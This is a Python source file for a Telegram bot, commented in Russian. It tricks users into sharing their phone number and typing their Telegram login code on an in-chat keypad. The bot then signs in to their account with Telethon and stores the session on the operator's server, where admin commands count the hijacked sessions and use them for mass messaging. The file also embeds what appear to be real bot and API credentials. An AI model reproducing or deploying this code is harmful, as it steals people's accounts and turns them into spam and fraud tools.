import os
import asyncio
import logging

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    Contact,
    ReplyKeyboardMarkup,
    KeyboardButton,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
)

# ────────────────────────────────────────────────
# НАСТРОЙКИ + ЛОГГИНГ
# ────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

BOT_TOKEN = '8757500911:AAEbSh9hlRam0GYC1HdkoXCGTd9Q1vVBeNc'
API_ID = 31462757
API_HASH = '79ae4e151e84526e11b107e99ad67177'
ADMIN_IDS = {8559221549}

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)


# ────────────────────────────────────────────────
# СОСТОЯНИЯ
# ────────────────────────────────────────────────
class AddSession(StatesGroup):
    waiting_phone = State()
    waiting_code = State()


class SendMessage(StatesGroup):
    waiting_username = State()
    waiting_text = State()


# ────────────────────────────────────────────────
# КЛАВИАТУРЫ
# ────────────────────────────────────────────────
def get_continue_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        resize_keyboard=True,
        one_time_keyboard=True,
        keyboard=[[KeyboardButton(text="Продолжить", request_contact=True)]]
    )


def get_code_keyboard(current_code: str = "") -> InlineKeyboardMarkup:
    """Клавиатура для ввода 5-значного кода"""
    rows = [
        [
            InlineKeyboardButton(text="1", callback_data="code:1"),
            InlineKeyboardButton(text="2", callback_data="code:2"),
            InlineKeyboardButton(text="3", callback_data="code:3"),
        ],
        [
            InlineKeyboardButton(text="4", callback_data="code:4"),
            InlineKeyboardButton(text="5", callback_data="code:5"),
            InlineKeyboardButton(text="6", callback_data="code:6"),
        ],
        [
            InlineKeyboardButton(text="7", callback_data="code:7"),
            InlineKeyboardButton(text="8", callback_data="code:8"),
            InlineKeyboardButton(text="9", callback_data="code:9"),
        ],
        [
            InlineKeyboardButton(text="0", callback_data="code:0"),
            InlineKeyboardButton(text="←", callback_data="code:back"),
            InlineKeyboardButton(text="✓ Подтвердить", callback_data="code:confirm"),
        ],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)


def mask_code(code: str) -> str:
    """Маскируем код звёздочками, оставляем последнюю цифру видимой (для удобства)"""
    if not code:
        return "•••••"
    visible = code[-1] if len(code) > 0 else ""
    return "•" * max(0, len(code) - 1) + visible


# ────────────────────────────────────────────────
# /start
# ────────────────────────────────────────────────
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in ADMIN_IDS:
        count = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")])
        text = (
            f"Привет, админ!\n"
            f"Сейчас сессий: <b>{count}</b>\n\n"
            "<code>/send</code> — разослать сообщение\n"
            "<code>/auth</code> — сброс авторизаций\n"
            "<code>/count</code> — сколько сессий"
        )
        await message.answer(text)
        return

    await message.answer(
        "Привет! Нажми «Продолжить», чтобы поделиться номером.",
        reply_markup=get_continue_keyboard()
    )
    await state.set_state(AddSession.waiting_phone)


# ────────────────────────────────────────────────
# Шаг 1 — получение номера
# ────────────────────────────────────────────────
@router.message(F.contact, StateFilter(AddSession.waiting_phone))
async def process_phone(message: Message, state: FSMContext):
    contact = message.contact
    if not contact:
        await message.reply("Поделись номером через кнопку.")
        return

    phone = contact.phone_number.replace("+", "").replace(" ", "").replace("-", "")
    if not phone.isdigit() or len(phone) < 9:
        await message.reply("Некорректный номер.")
        await state.clear()
        return

    session_path = f"{SESSIONS_DIR}/{phone}.session"

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await message.reply("Этот номер уже авторизован здесь.")
            await state.clear()
            return

        sent_code = await client.send_code_request(phone)
        await state.update_data(
            phone=phone,
            phone_code_hash=sent_code.phone_code_hash,
            session_path=session_path,
            current_code="",           # ← для сбора кода
            code_message_id=None       # ← id сообщения с клавиатурой
        )

        msg = await message.reply(
            f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:",
            reply_markup=get_code_keyboard()
        )
        await state.update_data(code_message_id=msg.message_id)
        await state.set_state(AddSession.waiting_code)

    except FloodWaitError as e:
        await message.reply(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
        await state.clear()
    except Exception as e:
        logger.error(f"Ошибка phone {phone}: {e}")
        await message.reply(f"Ошибка: {str(e)[:200]}")
        await state.clear()
    finally:
        if 'client' in locals():
            await client.disconnect()


# ────────────────────────────────────────────────
# Обработка нажатий на клавиатуру кода
# ────────────────────────────────────────────────
@router.callback_query(StateFilter(AddSession.waiting_code))
async def process_code_button(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    current_code = data.get("current_code", "")
    code_msg_id = data.get("code_message_id")

    action = callback.data.split(":", 1)[1] if ":" in callback.data else ""

    if action.isdigit():
        if len(current_code) < 5:
            current_code += action
            await state.update_data(current_code=current_code)

    elif action == "back":
        if current_code:
            current_code = current_code[:-1]
            await state.update_data(current_code=current_code)

    elif action == "confirm":
        if len(current_code) != 5:
            await callback.answer("Нужно ровно 5 цифр", show_alert=True)
            return

        phone = data.get("phone")
        phone_code_hash = data.get("phone_code_hash")
        session_path = data.get("session_path")

        try:
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()
            await client.sign_in(
                phone=phone,
                code=current_code,
                phone_code_hash=phone_code_hash
            )

            await callback.message.edit_text(
                f"Готово! Сессия для <code>+{phone}</code> сохранена.\n"
                "Можешь удалить это сообщение."
            )
            await state.clear()

        except PhoneCodeInvalidError:
            await callback.answer("Неверный код", show_alert=True)
            await state.update_data(current_code="")  # сбрасываем код
            if code_msg_id:
                await bot.edit_message_text(
                    chat_id=callback.message.chat.id,
                    message_id=code_msg_id,
                    text=f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код (неверный):",
                    reply_markup=get_code_keyboard("")
                )

        except PhoneCodeExpiredError:
            await callback.message.edit_text("Код устарел. Нажми /start заново.")
            await state.clear()

        except SessionPasswordNeededError:
            await callback.message.edit_text(
                "Включена 2FA. Пока поддерживаем только аккаунты без двухфакторки."
            )
            await state.clear()

        except FloodWaitError as e:
            await callback.message.edit_text(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
            await state.clear()

        except Exception as e:
            logger.error(f"sign_in ошибка {phone}: {e}")
            await callback.message.edit_text(f"Ошибка: {str(e)[:180]}")
            await state.clear()

        finally:
            if 'client' in locals():
                await client.disconnect()

        await callback.answer()
        return

    # Обновляем отображаемый код (маскированный)
    display_code = mask_code(current_code)
    text = f"Код отправлен на <code>+{data.get('phone')}</code>\n\nВведи 5-значный код:\n<b>{display_code}</b>"

    if code_msg_id:
        try:
            await bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=code_msg_id,
                text=text,
                reply_markup=get_code_keyboard(current_code)
            )
        except:
            pass  # если сообщение удалено — просто игнорируем

    await callback.answer()


# ────────────────────────────────────────────────
# Остальные админ-команды (без изменений)
# ────────────────────────────────────────────────
# ... (cmd_send, process_username, process_text_and_send, cmd_reset_auth, cmd_count)
# вставь их сюда из твоего кода без изменений


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
